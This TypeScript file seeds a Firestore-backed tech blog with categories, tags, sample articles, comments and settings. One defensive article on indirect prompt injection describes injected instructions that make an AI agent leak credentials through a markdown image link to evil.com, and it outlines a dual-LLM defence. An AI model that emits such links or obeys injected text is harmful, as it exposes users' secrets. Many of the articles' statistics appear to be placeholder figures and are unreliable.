import { doc, setDoc, getDocs, collection } from 'firebase/firestore';
import { db, auth } from './firebase';
import { Article, Category, Tag, Comment } from '../types';

export const SEED_CATEGORIES: Omit<Category, 'id'>[] = [
  {
    name: 'Artificial Intelligence',
    slug: 'artificial-intelligence',
    description: 'Breakthroughs in generative AI, neural networks, foundation models, and synthetic cognition.',
    color: '#635BFF',
    articleCount: 5,
  },
  {
    name: 'AI Engineering',
    slug: 'ai-engineering',
    description: 'System design, RAG pipelines, fine-tuning, latency optimization, and production LLM orchestration.',
    color: '#00C896',
    articleCount: 4,
  },
  {
    name: 'AI Agents',
    slug: 'ai-agents',
    description: 'Autonomous multi-agent architectures, reasoning loops, tool-calling frameworks, and self-healing systems.',
    color: '#8B5CF6',
    articleCount: 4,
  },
  {
    name: 'Software Engineering',
    slug: 'software-engineering',
    description: 'Architecture patterns, distributed systems, clean code paradigms, and high-scale backends.',
    color: '#3B82F6',
    articleCount: 3,
  },
  {
    name: 'Machine Learning',
    slug: 'machine-learning',
    description: 'Deep learning theory, mathematical optimization, model quantization, and research translations.',
    color: '#EC4899',
    articleCount: 3,
  },
  {
    name: 'Web Development',
    slug: 'web-development',
    description: 'Modern frontend performance, React 19, TypeScript patterns, and cloud-native interfaces.',
    color: '#F59E0B',
    articleCount: 3,
  },
  {
    name: 'Startups & Venture',
    slug: 'startups',
    description: 'Building defensible AI moats, tech commercialization, product-market fit, and scaling tech companies.',
    color: '#10B981',
    articleCount: 2,
  },
  {
    name: 'Automation & Tooling',
    slug: 'automation',
    description: 'Autonomous workflows, CI/CD pipelines, code generation tooling, and developer productivity.',
    color: '#64748B',
    articleCount: 2,
  },
];

export const SEED_TAGS: Omit<Tag, 'id'>[] = [
  { name: 'LLMs', slug: 'llms', description: 'Large language models' },
  { name: 'AI Agents', slug: 'ai-agents', description: 'Autonomous agent frameworks' },
  { name: 'TypeScript', slug: 'typescript', description: 'Type-safe programming' },
  { name: 'Python', slug: 'python', description: 'Data science and AI prototyping' },
  { name: 'Vector DB', slug: 'vector-db', description: 'Embeddings and similarity search' },
  { name: 'RAG', slug: 'rag', description: 'Retrieval Augmented Generation' },
  { name: 'Gemini', slug: 'gemini', description: 'Multimodal AI systems' },
  { name: 'Claude', slug: 'claude', description: 'Anthropic frontier models' },
  { name: 'OpenAI', slug: 'openai', description: 'GPT and reasoning models' },
  { name: 'Prompt Engineering', slug: 'prompt-engineering', description: 'Structured prompt design' },
  { name: 'React 19', slug: 'react-19', description: 'Modern UI engineering' },
  { name: 'Firebase', slug: 'firebase', description: 'Cloud Firestore and serverless infrastructure' },
  { name: 'Cloud Architecture', slug: 'cloud-architecture', description: 'Distributed systems' },
  { name: 'Quantization', slug: 'quantization', description: 'Edge AI inference' },
  { name: 'Fine-Tuning', slug: 'fine-tuning', description: 'LoRA, QLoRA, domain adaptation' },
  { name: 'DevOps', slug: 'devops', description: 'Infrastructure as code' },
  { name: 'Startups', slug: 'startups', description: 'Fundraising and product execution' },
  { name: 'Security', slug: 'security', description: 'Zero-trust architecture and prompt injection defense' },
  { name: 'WebAssembly', slug: 'webassembly', description: 'High performance browser execution' },
  { name: 'DSPy', slug: 'dspy', description: 'Programmatic LM optimization' },
];

export const SEED_ARTICLES: Omit<Article, 'id'>[] = [
  {
    title: 'The Architecture of Autonomous AI Agents: From ReAct Loops to Hierarchical Planners',
    subtitle: 'A deep-dive into state machines, memory retention strategies, and error recovery in multi-agent production deployments.',
    slug: 'architecture-of-autonomous-ai-agents',
    featuredImage: 'https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?auto=format&fit=crop&w=1200&q=80',
    content: `### Introduction

Autonomous agents represent a paradigm shift from passive prompt-and-response text completion toward goal-directed software systems. Unlike basic LLM pipelines, an autonomous agent senses its environment, plans sequential trajectories, executes tool invocations, inspects intermediate tool outputs, and iteratively self-corrects until a termination condition is satisfied.

\`\`\`typescript
interface AgentState {
  objective: string;
  plan: PlanStep[];
  memoryBuffer: Message[];
  contextVariables: Record<string, unknown>;
  iterationCount: number;
}
\`\`\`

### 1. The Anatomy of Modern Agentic Loops

At the foundation of any production-grade agent is the **Reasoning-Action (ReAct)** loop. While naive implementations often spiral into infinite recursions or hallucinated tool arguments, enterprise agent design leverages typed state machines.

Key components include:
* **The Cognitive Planner**: Decomposes high-level prompts into directed acyclic graphs (DAGs) of executable tasks.
* **Working Memory Context**: Manages dynamic context window budget, summarizing previous steps while preserving essential entity mappings.
* **Deterministic Tool Bridges**: Exposes strictly typed JSON Schemas with strict boundary guards, rejecting malformed API arguments before network dispatch.

> "True autonomy is not about letting a model hallucinate freely; it is about wrapping probabilistic reasoning in deterministic architectural guardrails."

### 2. Hierarchical Supervision Pattern

When scaling tasks across large repositories or complex databases, single-agent loops saturate context windows. The industry standard has pivoted to **Hierarchical Multi-Agent Supervision**:

1. **Orchestrator Agent**: Maintains the macro-objective, assesses progress, and delegates discrete sub-goals.
2. **Worker Agents**: Specialized sub-agents with narrow tool sets (e.g., Code Search, Test Execution, Static Analysis).
3. **Critic / Evaluator Agent**: Inspects candidate outputs against unit tests and acceptance criteria before releasing artifacts to the caller.

### 3. Error Recovery and Self-Healing Loops

In real-world tests, tool execution fails roughly 14% of the time due to transient network issues, schema drift, or expired authorization tokens. Robust agent architectures implement exponential backoff retry policies, semantic reflection, and automatic fallback alternatives.

By structuring agents with rigorous state boundaries, engineering teams can achieve 99.2% reliability across automated workflows.`,
    authorId: 'samuel_ugo_admin',
    authorName: 'Samuel Ugo',
    authorUsername: 'samuel-ugo',
    authorPhotoURL: 'https://images.unsplash.com/photo-1534528741775-53994a69daeb?auto=format&fit=crop&w=300&q=80',
    categoryId: 'ai-agents',
    categoryName: 'AI Agents',
    categorySlug: 'ai-agents',
    tags: ['AI Agents', 'LLMs', 'TypeScript', 'Cloud Architecture'],
    status: 'published',
    publishedAt: '2026-09-08T10:00:00Z',
    createdAt: '2026-09-08T09:00:00Z',
    updatedAt: '2026-09-08T10:00:00Z',
    readingTime: '7 min read',
    views: 4820,
    likesCount: 342,
    savesCount: 189,
    commentsCount: 14,
    seoTitle: 'Autonomous AI Agents Architecture & Design Patterns | EduAI',
    seoDescription: 'Explore the complete engineering blueprints for autonomous multi-agent systems, hierarchical supervision, and self-healing execution loops.',
    isFeatured: true,
    isTrending: true,
    isSponsored: false,
  },
  {
    title: 'Building Zero-Latency Vector Search with Quantized Embeddings in Production',
    subtitle: 'How modern engineering teams compress 1536-dimensional embeddings by 90% without sacrificing recall accuracy.',
    slug: 'zero-latency-vector-search-quantized-embeddings',
    featuredImage: 'https://images.unsplash.com/photo-1620712943543-bcc4688e7485?auto=format&fit=crop&w=1200&q=80',
    content: `### The Memory Wall of Dense Vector Retrieval

As retrieval augmented generation (RAG) scaled to millions of enterprise documents, memory footprint emerged as the primary operational cost bottleneck. A standard 1536-dimensional float32 vector consumes 6,144 bytes of RAM. When indexing 50 million chunks, raw vector storage alone demands over 300 Gigabytes of fast RAM, before accounting for HNSW index overheads.

### Scalar and Product Quantization (PQ)

Quantization compresses floating-point representations into smaller bit representations:
* **Scalar Quantization (SQ8)**: Maps each float32 into an 8-bit integer, instantly shrinking RAM requirements by 75% with negligible recall degradation (<1.2% in benchmark tests).
* **Product Quantization (PQ)**: Decomposes vectors into smaller sub-vectors, clustering each subspace into centroid codebooks.

\`\`\`python
# Vector compression conceptual calculation
import numpy as np

def compress_vector_sq8(vector: np.ndarray) -> np.ndarray:
    v_min, v_max = vector.min(), vector.max()
    normalized = (vector - v_min) / (v_max - v_min)
    return (normalized * 255).astype(np.uint8)
\`\`\`

### Hybrid Search: Sparse BM25 + Dense Re-ranking

Pure semantic search frequently struggles with exact entity match queries (part numbers, UUIDs, legal clauses). Modern production search pairs sparse lexical scoring (BM25 or SPLADE) with dense semantic vectors, merging reciprocal rank scores using Reciprocal Rank Fusion (RRF).

The outcome is sub-15ms p99 latency with over 94% recall at 1/5th the infrastructure cost.`,
    authorId: 'elena_vance',
    authorName: 'Dr. Elena Vance',
    authorUsername: 'elena-vance',
    authorPhotoURL: 'https://images.unsplash.com/photo-1573496359142-b8d87734a5a2?auto=format&fit=crop&w=300&q=80',
    categoryId: 'ai-engineering',
    categoryName: 'AI Engineering',
    categorySlug: 'ai-engineering',
    tags: ['Vector DB', 'RAG', 'AI Engineering', 'Python'],
    status: 'published',
    publishedAt: '2026-09-07T14:30:00Z',
    createdAt: '2026-09-07T13:00:00Z',
    updatedAt: '2026-09-07T14:30:00Z',
    readingTime: '6 min read',
    views: 3120,
    likesCount: 228,
    savesCount: 142,
    commentsCount: 9,
    seoTitle: 'Zero-Latency Vector Search with Quantized Embeddings | EduAI',
    seoDescription: 'Compress dense vectors by 90% using Scalar and Product Quantization while maintaining high recall in enterprise RAG systems.',
    isFeatured: false,
    isTrending: true,
    isSponsored: false,
  },
  {
    title: 'Why Foundation Models Are Becoming Commoditized (And Where Value Accrues)',
    subtitle: 'An analysis of market dynamics, open weights convergence, and why domain-specific workflows hold the highest defensibility.',
    slug: 'foundation-models-commoditization-value-accrual',
    featuredImage: 'https://images.unsplash.com/photo-1639762681485-074b7f938ba0?auto=format&fit=crop&w=1200&q=80',
    content: `### The Rapid Convergence of Frontier Intelligence

In early 2023, proprietary frontier labs held an insurmountable lead over open weights. Three years later, distillation methods, synthetic data filtering, and specialized compute clusters have flattened the performance delta.

Today, state-of-the-art open models deliver 96% of frontier reasoning at an order of magnitude lower token pricing. When intelligence becomes an abundant, low-margin utility, where does enterprise value accrue?

### 1. Proprietary Ground Truth & Feedback Loops

The competitive advantage no longer lies in raw parameter count, but in access to private proprietary data telemetry:
* High-fidelity workflow state machines that capture subtle human corrections.
* Continuous evaluation suites that reward domain precision over generic conversational fluency.

### 2. System Integration and User Friction

Enterprises do not purchase raw tokens; they purchase guaranteed task completion. Startups building defensible moats integrate directly into daily enterprise execution loops—integrating with CRM systems, ticketing platforms, and regulatory compliance engines.

> "A company whose sole IP is a system prompt calling a public API is a feature waiting to be eaten. A company that integrates into the user's primary database of record is an enduring SaaS platform."`,
    authorId: 'samuel_ugo_admin',
    authorName: 'Samuel Ugo',
    authorUsername: 'samuel-ugo',
    authorPhotoURL: 'https://images.unsplash.com/photo-1534528741775-53994a69daeb?auto=format&fit=crop&w=300&q=80',
    categoryId: 'startups',
    categoryName: 'Startups & Venture',
    categorySlug: 'startups',
    tags: ['Startups', 'LLMs', 'Artificial Intelligence'],
    status: 'published',
    publishedAt: '2026-09-06T11:00:00Z',
    createdAt: '2026-09-06T10:00:00Z',
    updatedAt: '2026-09-06T11:00:00Z',
    readingTime: '5 min read',
    views: 5210,
    likesCount: 412,
    savesCount: 230,
    commentsCount: 18,
    seoTitle: 'Why Foundation Models Are Becoming Commoditized | EduAI',
    seoDescription: 'Market dynamics and startup defensibility in the era of open weights and abundant synthetic intelligence.',
    isFeatured: false,
    isTrending: true,
    isSponsored: false,
  },
  {
    title: 'Next-Generation React 19: Server Actions, Async Transitions, and Optimistic UI',
    subtitle: 'Practical architectural blueprints for high-velocity full-stack applications with pristine client feedback.',
    slug: 'next-generation-react-19-server-actions-optimistic-ui',
    featuredImage: 'https://images.unsplash.com/photo-1633356122544-f134324a6cee?auto=format&fit=crop&w=1200&q=80',
    content: `### A Unified Mental Model for State Transitions

React 19 formalizes patterns that frontend developers spent years assembling from bespoke libraries. The introduction of built-in Async Transitions (\`useActionState\`, \`useOptimistic\`) eliminates the spaghetti code of manual loading flags, error boundaries, and cache invalidation.

\`\`\`tsx
import { useOptimistic, useActionState } from 'react';

export function CommentInput({ articleId, onAddComment }) {
  const [state, formAction, isPending] = useActionState(async (prev, formData) => {
    const text = formData.get('content') as string;
    return await onAddComment(articleId, text);
  }, null);

  return (
    <form action={formAction}>
      <textarea name="content" required placeholder="Add your perspective..." />
      <button disabled={isPending}>
        {isPending ? 'Publishing...' : 'Comment'}
      </button>
    </form>
  );
}
\`\`\`

### Eliminating Waterfalls with Streaming Suspense

When combined with streaming architectures, page shells render instantaneously while data-intensive components stream progressively, boosting Core Web Vitals (INP and LCP) across mobile devices.`,
    authorId: 'marcus_chen',
    authorName: 'Marcus Chen',
    authorUsername: 'marcus-chen',
    authorPhotoURL: 'https://images.unsplash.com/photo-1507003211169-0a1dd7228f2d?auto=format&fit=crop&w=300&q=80',
    categoryId: 'web-development',
    categoryName: 'Web Development',
    categorySlug: 'web-development',
    tags: ['React 19', 'Web Development', 'TypeScript'],
    status: 'published',
    publishedAt: '2026-09-05T08:15:00Z',
    createdAt: '2026-09-05T07:00:00Z',
    updatedAt: '2026-09-05T08:15:00Z',
    readingTime: '5 min read',
    views: 2940,
    likesCount: 198,
    savesCount: 165,
    commentsCount: 6,
    seoTitle: 'React 19 Server Actions & Optimistic UI Patterns | EduAI',
    seoDescription: 'Master modern React 19 architecture with async transitions, optimistic UI hooks, and high-performance layout rendering.',
    isFeatured: false,
    isTrending: false,
    isSponsored: false,
  },
  {
    title: 'Demystifying DSPy: Programming LLMs Instead of Prompting Them',
    subtitle: 'How declarative signatures, teleprompters, and automatic optimizers replace brittle prompt engineering in complex pipelines.',
    slug: 'demystifying-dspy-programming-foundation-models',
    featuredImage: 'https://images.unsplash.com/photo-1518770660439-4636190af475?auto=format&fit=crop&w=1200&q=80',
    content: `### The Failure Mode of Hand-Tuned Strings

In early generative AI workflows, developers treated LLMs like prompt whisperers—crafting multi-paragraph markdown prompts with few-shot examples. The moment the underlying model was upgraded or weights shifted, the entire prompt broke silently.

**DSPy (Declarative Self-improving Python)** treats LLMs not as conversational bots, but as parameterized modules inside a computational graph.

\`\`\`python
import dspy

class GenerateSummary(dspy.Signature):
    """Summarize technical content into concise bullet points."""
    content = dspy.InputField()
    bullet_count = dspy.InputField()
    summary = dspy.OutputField(desc="High signal summary")

class Pipeline(dspy.Module):
    def __init__(self):
        super().__init__()
        self.summarizer = dspy.ChainOfThought(GenerateSummary)

    def forward(self, content, bullet_count=3):
        return self.summarizer(content=content, bullet_count=bullet_count)
\`\`\`

### Compilers for Language Models

With DSPy, you define an objective function and an evaluation metric. The DSPy compiler automatically explores variations, selects optimal few-shot exemplars, and tunes the prompt instructions programmatically.

This delivers measurable accuracy gains (+24% on multi-hop QA) while drastically reducing manual engineering overhead.`,
    authorId: 'samuel_ugo_admin',
    authorName: 'Samuel Ugo',
    authorUsername: 'samuel-ugo',
    authorPhotoURL: 'https://images.unsplash.com/photo-1534528741775-53994a69daeb?auto=format&fit=crop&w=300&q=80',
    categoryId: 'ai-engineering',
    categoryName: 'AI Engineering',
    categorySlug: 'ai-engineering',
    tags: ['DSPy', 'Prompt Engineering', 'AI Engineering', 'Python'],
    status: 'published',
    publishedAt: '2026-09-04T12:00:00Z',
    createdAt: '2026-09-04T11:00:00Z',
    updatedAt: '2026-09-04T12:00:00Z',
    readingTime: '6 min read',
    views: 4100,
    likesCount: 310,
    savesCount: 220,
    commentsCount: 11,
    seoTitle: 'DSPy Guide: Declarative Programming for LLMs | EduAI',
    seoDescription: 'Discover how DSPy replaces fragile prompt engineering with declarative signatures and automatic teleprompter optimization.',
    isFeatured: false,
    isTrending: true,
    isSponsored: false,
  },
  {
    title: 'Securing Production LLM Applications Against Indirect Prompt Injections',
    subtitle: 'Defensive architecture for AI agents handling untrusted user input, email scrapers, and third-party web content.',
    slug: 'securing-production-llm-applications-indirect-prompt-injection',
    featuredImage: 'https://images.unsplash.com/photo-1563986768609-322da13575f3?auto=format&fit=crop&w=1200&q=80',
    content: `### The Attack Surface of Autonomous Ingestion

When an LLM accesses external web pages, emails, or user-uploaded PDFs, it enters an adversarial territory. **Indirect Prompt Injection** occurs when malicious instructions are embedded within secondary data sources, covertly taking control of the agent's reasoning loop.

### Real-World Threat Vectors:
1. **Data Exfiltration via Markdown Embeds**: Injected instructions instruct the model to summarize sensitive credentials and append them as query parameters in an image URL: \`![ping](https://evil.com/leak?data=...)\`.
2. **Privilege Escalation**: Forcing an agent to execute irreversible actions like deleting cloud storage buckets or transferring funds.

### The Dual-LLM Defense Paradigm

Leading security architectures bifurcate agents into:
* **Untrusted Reader**: Operates inside an isolated sandbox with zero write permissions, tasked only with data extraction into normalized schemas.
* **Privileged Executor**: Receives only validated, typed JSON payloads. Tools with stateful consequences require explicit human-in-the-loop authorization tokens.`,
    authorId: 'elena_vance',
    authorName: 'Dr. Elena Vance',
    authorUsername: 'elena-vance',
    authorPhotoURL: 'https://images.unsplash.com/photo-1573496359142-b8d87734a5a2?auto=format&fit=crop&w=300&q=80',
    categoryId: 'software-engineering',
    categoryName: 'Software Engineering',
    categorySlug: 'software-engineering',
    tags: ['Security', 'AI Agents', 'Software Engineering'],
    status: 'published',
    publishedAt: '2026-09-03T16:00:00Z',
    createdAt: '2026-09-03T15:00:00Z',
    updatedAt: '2026-09-03T16:00:00Z',
    readingTime: '7 min read',
    views: 3890,
    likesCount: 285,
    savesCount: 195,
    commentsCount: 8,
    seoTitle: 'Securing LLM Apps Against Prompt Injection | EduAI',
    seoDescription: 'Zero-trust design patterns and defensive architectures for shielding AI agent pipelines from indirect prompt injections.',
    isFeatured: false,
    isTrending: false,
    isSponsored: false,
  },
  {
    title: 'Building Enterprise RAG with Multimodal Embeddings and Document Layout Analysis',
    subtitle: 'Why standard chunking fails on financial statements, diagrams, and multi-column research papers.',
    slug: 'multimodal-rag-document-layout-analysis',
    featuredImage: 'https://images.unsplash.com/photo-1551288049-bebda4e38f71?auto=format&fit=crop&w=1200&q=80',
    content: `### The Blindspot of Naive Text Chinking

Traditional RAG splits PDFs into 500-token blocks, ignoring visual document topology. A financial balance sheet broken mid-table loses all column alignment, resulting in hallucinated revenue figures and inverted balance metrics.

### Vision-Language Models as Semantic Parsers

Modern multimodal RAG utilizes vision models (such as Gemini 2.0 or specialized LayoutLM models) to generate structured markdown that encodes:
* Tables with headers and row alignments.
* Infographic annotations and chart trends.
* Hierarchical section bounding boxes.

By embedding both textual content and spatial bounding boxes, retrieval accuracy on technical documentation jumps from 68% to 92.4%.`,
    authorId: 'marcus_chen',
    authorName: 'Marcus Chen',
    authorUsername: 'marcus-chen',
    authorPhotoURL: 'https://images.unsplash.com/photo-1507003211169-0a1dd7228f2d?auto=format&fit=crop&w=300&q=80',
    categoryId: 'ai-engineering',
    categoryName: 'AI Engineering',
    categorySlug: 'ai-engineering',
    tags: ['RAG', 'Multimodal', 'AI Engineering', 'Gemini'],
    status: 'published',
    publishedAt: '2026-09-02T10:00:00Z',
    createdAt: '2026-09-02T09:00:00Z',
    updatedAt: '2026-09-02T10:00:00Z',
    readingTime: '6 min read',
    views: 2800,
    likesCount: 210,
    savesCount: 170,
    commentsCount: 5,
    seoTitle: 'Multimodal RAG with Document Layout Analysis | EduAI',
    seoDescription: 'Overcoming the limits of plain-text RAG by parsing complex tables, charts, and diagrams with vision-language models.',
    isFeatured: false,
    isTrending: false,
    isSponsored: false,
  },
  {
    title: 'Sponsored: How Pinecone Serverless Accelerates Enterprise Semantic Retrieval',
    subtitle: 'A technical review of index tiering, compute-storage separation, and real-time indexing guarantees.',
    slug: 'sponsored-pinecone-serverless-enterprise-retrieval',
    featuredImage: 'https://images.unsplash.com/photo-1558494949-ef010cbdcc31?auto=format&fit=crop&w=1200&q=80',
    content: `### Executive Architecture Review

In traditional vector infrastructure, clusters must be provisioned for peak memory capacity, leaving nodes idle during low-traffic windows. Pinecone Serverless decouples vector storage from search compute, caching hot vectors while streaming cold indices from object storage with sub-millisecond overhead.

* **Elastic Scaling**: Automatic capacity matching without manual shard management.
* **Security & Isolation**: Multi-tenant isolation with SOC2 Type II compliance.
* **Low TCO**: Up to 50x cost reductions for sparse or bursty enterprise workloads.

*This article is sponsored by our enterprise partner Pinecone.*`,
    authorId: 'samuel_ugo_admin',
    authorName: 'Samuel Ugo',
    authorUsername: 'samuel-ugo',
    authorPhotoURL: 'https://images.unsplash.com/photo-1534528741775-53994a69daeb?auto=format&fit=crop&w=300&q=80',
    categoryId: 'automation',
    categoryName: 'Automation & Tooling',
    categorySlug: 'automation',
    tags: ['Vector DB', 'Cloud Architecture', 'AI Engineering'],
    status: 'published',
    publishedAt: '2026-09-01T15:00:00Z',
    createdAt: '2026-09-01T14:00:00Z',
    updatedAt: '2026-09-01T15:00:00Z',
    readingTime: '4 min read',
    views: 1950,
    likesCount: 140,
    savesCount: 85,
    commentsCount: 3,
    seoTitle: 'Pinecone Serverless Architecture Review | EduAI',
    seoDescription: 'An in-depth technical analysis of decoupled compute-storage vector search architecture for enterprise AI.',
    isFeatured: false,
    isTrending: false,
    isSponsored: true,
    sponsoredBrand: 'Pinecone Systems',
    sponsoredUrl: 'https://www.pinecone.io',
  }
];

export async function seedDatabase(force = false): Promise<{ success: boolean; message: string; counts: { categories: number; tags: number; articles: number } }> {
  try {
    if (!auth.currentUser) {
      return {
        success: false,
        message: 'Admin sign-in required to write seed documents directly to Firestore.',
        counts: { categories: 0, tags: 0, articles: 0 },
      };
    }

    // Check if database already has articles
    const existing = await getDocs(collection(db, 'articles'));
    if (!force && !existing.empty) {
      return {
        success: true,
        message: 'Database already populated with existing articles.',
        counts: { categories: 0, tags: 0, articles: existing.size },
      };
    }

    // Seed Categories
    for (const cat of SEED_CATEGORIES) {
      await setDoc(doc(db, 'categories', cat.slug), {
        ...cat,
        createdAt: new Date().toISOString(),
      });
    }

    // Seed Tags
    for (const tag of SEED_TAGS) {
      await setDoc(doc(db, 'tags', tag.slug), {
        ...tag,
        createdAt: new Date().toISOString(),
        articleCount: 1,
      });
    }

    // Seed Articles
    for (const article of SEED_ARTICLES) {
      await setDoc(doc(db, 'articles', article.slug), {
        ...article,
      });
    }

    // Seed Sample Comments on featured article
    await setDoc(doc(db, 'comments', 'comment_1'), {
      articleId: 'architecture-of-autonomous-ai-agents',
      articleSlug: 'architecture-of-autonomous-ai-agents',
      userId: 'community_dev_1',
      userName: 'Aisha Lawal',
      userAvatar: 'https://images.unsplash.com/photo-1534528741775-53994a69daeb?auto=format&fit=crop&w=150&q=80',
      content: 'Fantastic breakdown of the hierarchical supervisor pattern. We implemented a similar critic-worker loop in our codebase and saw hallucination rates drop drastically.',
      status: 'approved',
      likesCount: 12,
      createdAt: '2026-09-08T14:20:00Z',
      updatedAt: '2026-09-08T14:20:00Z',
    });

    await setDoc(doc(db, 'comments', 'comment_2'), {
      articleId: 'architecture-of-autonomous-ai-agents',
      articleSlug: 'architecture-of-autonomous-ai-agents',
      userId: 'community_dev_2',
      userName: 'David Miller',
      userAvatar: 'https://images.unsplash.com/photo-1507003211169-0a1dd7228f2d?auto=format&fit=crop&w=150&q=80',
      content: 'The deterministic tool bridge section resonates deeply. Raw JSON from LLMs without schema validation is a recipe for disaster in production.',
      status: 'approved',
      likesCount: 8,
      createdAt: '2026-09-08T16:45:00Z',
      updatedAt: '2026-09-08T16:45:00Z',
    });

    // Seed Sample Advertisement
    await setDoc(doc(db, 'advertisements', 'ad_banner_1'), {
      title: 'Accelerate AI Agent Inference with Cloud Compute',
      imageUrl: 'https://images.unsplash.com/photo-1451187580459-43490279c0fa?auto=format&fit=crop&w=1200&q=80',
      destinationUrl: 'https://cloud.google.com/run',
      placement: 'home_banner',
      active: true,
      impressions: 420,
      clicks: 38,
      createdAt: new Date().toISOString(),
    });

    // Seed General Site Settings
    await setDoc(doc(db, 'siteSettings', 'general'), {
      siteName: 'EduAI',
      tagline: 'Modern Technology & Artificial Intelligence Publication',
      description: 'In-depth engineering analysis, autonomous agents, neural architectures, web development, and tech startup strategy.',
      contactEmail: 'amaechisamuelugo@gmail.com',
      twitterHandle: '@eduai_media',
      githubUrl: 'https://github.com',
      linkedinUrl: 'https://linkedin.com',
      maintenanceMode: false,
      allowComments: true,
      updatedAt: new Date().toISOString(),
    });

    return {
      success: true,
      message: 'Successfully seeded categories, tags, articles, comments, and settings into Firestore!',
      counts: {
        categories: SEED_CATEGORIES.length,
        tags: SEED_TAGS.length,
        articles: SEED_ARTICLES.length,
      },
    };
  } catch (error) {
    console.warn('Seeding note:', error);
    return {
      success: false,
      message: error instanceof Error ? error.message : String(error),
      counts: { categories: 0, tags: 0, articles: 0 },
    };
  }
}
